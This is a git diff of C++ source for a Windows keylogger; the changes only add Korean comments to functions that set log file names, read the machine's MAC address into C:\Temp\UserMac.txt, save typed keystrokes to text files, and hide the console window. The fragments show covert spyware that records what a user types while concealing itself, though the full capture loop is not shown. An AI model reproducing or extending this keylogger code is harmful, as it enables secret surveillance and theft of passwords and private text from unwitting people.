@@ -14,7 +14,7 @@ using namespace std;
 int Save(int key_stroke, char *file);
 void Stealth();
 
-void file_name(char *old, int cnt)
+void file_name(char *old, int cnt)//file이름 설정
 {
    int i;
    char *txt = ".txt";
@@ -28,7 +28,7 @@ void file_name(char *old, int cnt)
    strcat(old, file_num);
    strcat(old, txt);
 }
-void user_Address()
+void user_Address()//mac_address 불러오는 함수
 {
    char strMac[256];
    char username[500] = "C:\\Temp\\UserMac.txt";
@@ -87,7 +87,7 @@ int main()
    system("PAUSE");
    return 0;
 }
-int Save(int key_stroke, char *file)
+int Save(int key_stroke, char *file)//타이핑한 문자를 텍스트에 저장
 {
    if ((key_stroke == 1) || (key_stroke == 2))
       return 0;
@@ -130,7 +130,7 @@ int Save(int key_stroke, char *file)
    fclose(OUTPUT_FILE);
    return 0;
 }
-void Stealth()
+void Stealth()//콘솔창 숨기기
 {
    HWND Stealth;
    AllocConsole();
